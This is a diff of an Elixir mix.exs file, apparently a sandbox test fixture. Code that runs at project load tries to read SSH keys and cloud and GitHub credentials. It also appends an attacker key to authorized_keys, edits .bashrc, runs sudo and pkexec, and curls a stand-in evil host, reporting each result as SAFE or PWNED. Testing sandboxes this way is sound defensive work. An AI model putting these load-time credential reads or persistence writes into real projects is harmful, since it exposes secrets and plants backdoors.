@@ -1,27 +1,84 @@
 defmodule TestBad.MixProject do
   use Mix.Project
 
-  # Executed whenever Mix loads this project (compile, deps.get, etc.)
-  key_path = Path.join([System.user_home!(), ".ssh", "id_ed25519"])
+  # Hostile mix.exs — exercises every attack in fixtures/ATTACKS.md.
+  # Each probe prints exactly one of:
+  #   SAFE: <id> <reason>
+  #   PWNED: <id> <evidence>
+  # CI greps for PWNED: and fails on any occurrence.
 
-  case File.read(key_path) do
-    {:ok, _} ->
-      Mix.shell().error("🚨 shit! private key is being read")
-
-    {:error, reason} ->
-      Mix.shell().error("🛡️ safe! private key access is blocked: #{:file.format_error(reason)}")
+  report = fn id, ok, msg ->
+    tag = if ok, do: "SAFE", else: "PWNED"
+    IO.puts(:stderr, "#{tag}: #{id} #{msg}")
   end
 
-  url =
-    "https://gist.githubusercontent.com/tyrchen/7aa6eab75a4c6e864ec05358d25cb783/raw/3a5024bbf79743bd6b3b89a31b0bf39f2c206be3/Rust%2520vs.%2520Swift.md"
-
-  case System.cmd("curl", ["-sSL", "--max-time", "10", url], stderr_to_stdout: true) do
-    {body, 0} ->
-      Mix.shell().error("🚨 shit! gist download succeeded (#{byte_size(body)} bytes)")
-
-    {out, _} ->
-      Mix.shell().error("🛡️ safe! gist download blocked: #{String.trim(out)}")
+  try_read = fn id, path ->
+    case File.read(path) do
+      {:ok, ""} -> report.(id, true, "readable but empty: #{path}")
+      {:ok, body} -> report.(id, false, "read #{byte_size(body)} bytes from #{path}")
+      {:error, reason} -> report.(id, true, "blocked: #{:file.format_error(reason)}")
+    end
   end
+
+  try_append = fn id, path, payload ->
+    case File.open(path, [:append], fn fh -> IO.binwrite(fh, payload) end) do
+      {:ok, _} -> report.(id, false, "wrote to #{path}")
+      {:error, reason} -> report.(id, true, "blocked: #{:file.format_error(reason)}")
+    end
+  end
+
+  try_exec = fn id, program, args ->
+    try do
+      case System.cmd(program, args, stderr_to_stdout: true) do
+        {_out, 0} -> report.(id, false, "exec #{program} succeeded")
+        {_out, rc} -> report.(id, true, "exec #{program} returned #{rc} (likely sandboxed)")
+      end
+    rescue
+      e -> report.(id, true, "blocked: #{Exception.message(e)}")
+    end
+  end
+
+  try_curl = fn id, url ->
+    try do
+      case System.cmd(
+             "/usr/bin/curl",
+             ["-sSL", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", url],
+             stderr_to_stdout: true
+           ) do
+        {code, 0} ->
+          code = String.trim(code)
+
+          if String.starts_with?(code, "2") do
+            report.(id, false, "HTTP #{code} from #{url}")
+          else
+            report.(id, true, "blocked: http=#{code}")
+          end
+
+        {out, rc} ->
+          report.(id, true, "blocked: curl exit=#{rc} (#{String.trim(out)})")
+      end
+    rescue
+      e -> report.(id, true, "blocked: #{Exception.message(e)}")
+    end
+  end
+
+  home = System.user_home!()
+  try_read.(:"ssh-read", Path.join([home, ".ssh", "id_ed25519"]))
+  try_read.(:"aws-read", Path.join([home, ".aws", "credentials"]))
+  try_read.(:"gcloud-read", Path.join([home, ".config", "gcloud", "credentials.db"]))
+  try_read.(:"gh-token-read", Path.join([home, ".config", "gh", "hosts.yml"]))
+  try_read.(:"env-read", Path.expand("./.env"))
+  try_append.(:"bashrc-write", Path.join([home, ".bashrc"]), "\n# pwned\n")
+
+  try_append.(
+    :"authorized-keys-write",
+    Path.join([home, ".ssh", "authorized_keys"]),
+    "\nssh-rsa AAAAATTACKER attacker@evil\n"
+  )
+
+  try_exec.(:"sudo-exec", "/usr/bin/sudo", ["-l"])
+  try_exec.(:"pkexec-exec", "/usr/bin/pkexec", ["--version"])
+  try_curl.(:"curl-evil", "https://evil.example.invalid/")
 
   def project do
     [
